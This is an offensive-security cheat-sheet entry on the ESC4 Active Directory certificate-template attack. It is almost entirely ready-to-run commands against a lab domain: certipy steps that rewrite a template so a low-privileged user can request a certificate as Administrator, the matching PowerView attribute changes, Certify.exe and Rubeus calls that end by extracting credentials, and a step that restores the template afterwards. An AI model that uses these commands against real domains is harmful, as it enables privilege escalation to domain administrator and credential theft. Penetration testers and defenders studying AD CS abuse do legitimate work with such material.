# 13.07 ESC4 Vulnerable Template ACLs

> Hold FullControl/WriteDACL/WriteProperty on a template — flip it ESC1-style with `certipy`, exploit, then restore the original config.

## Overview

When a low-privileged user holds Full Control, WriteOwner, WriteDACL, or WriteProperty over a certificate template, they can modify its attributes to introduce an ESC1-style misconfiguration, exploit it, then restore the original settings. Certipy automates this with one command; the Windows path uses PowerView Set-DomainObject calls followed by Certify.exe.

## Steps

- Identify via certipy find: ESC4 vulnerability shows Full Control Principals or Write* principals for a low-priv user
- From Linux: certipy template -save-old modifies template to ESC1-equivalent and saves backup JSON
- Request cert with -upn Administrator, authenticate, then restore with -configuration ESC4.json
- From Windows: use PowerView to add enrollment rights, disable PEND_ALL_REQUESTS flag, set mspki-ra-signature=0, enable ENROLLEE_SUPPLIES_SUBJECT, and set Client Authentication OID
- Then request cert with Certify.exe /altname:Administrator and authenticate with Rubeus

## Commands

### certipy template modify + save old

```bash
certipy template -u 'blwasp@lab.local' -p 'Password123!' -template ESC4 -save-old
```

### certipy req ESC4

```bash
certipy req -u 'blwasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template ESC4 -upn Administrator
```

### certipy auth

```bash
certipy auth -pfx administrator.pfx -username Administrator -domain lab.local
```

### certipy template restore

```bash
certipy template -u 'blwasp@lab.local' -p 'Password123!' -template ESC4 -configuration ESC4.json
```

### PowerView add enrollment rights

```powershell
Add-DomainObjectAcl -TargetIdentity ESC4 -PrincipalIdentity "Domain Users" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=lab,DC=local" -Verbose
```

### PowerView disable manager approval

```powershell
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-enrollment-flag'=9} -Verbose
```

### PowerView disable authorized sig

```powershell
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-ra-signature'=0} -Verbose
```

### PowerView enable SAN flag

```powershell
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-certificate-name-flag'=1} -Verbose
```

### PowerView set Client Auth EKU

```powershell
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'pkiextendedkeyusage'='1.3.6.1.5.5.7.3.2'} -Verbose
```

### PowerView set app policy

```powershell
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
```

### Certify.exe request ESC4

```powershell
.\Certify.exe request /ca:LAB-DC\lab-LAB-DC-CA /template:ESC4 /altname:Administrator
```

### OpenSSL convert

```powershell
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in admin-esc4.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin-esc4.pfx
```

### Rubeus asktgt

```powershell
.\Rubeus.exe asktgt /user:administrator /certificate:admin-esc4.pfx /getcredentials
```
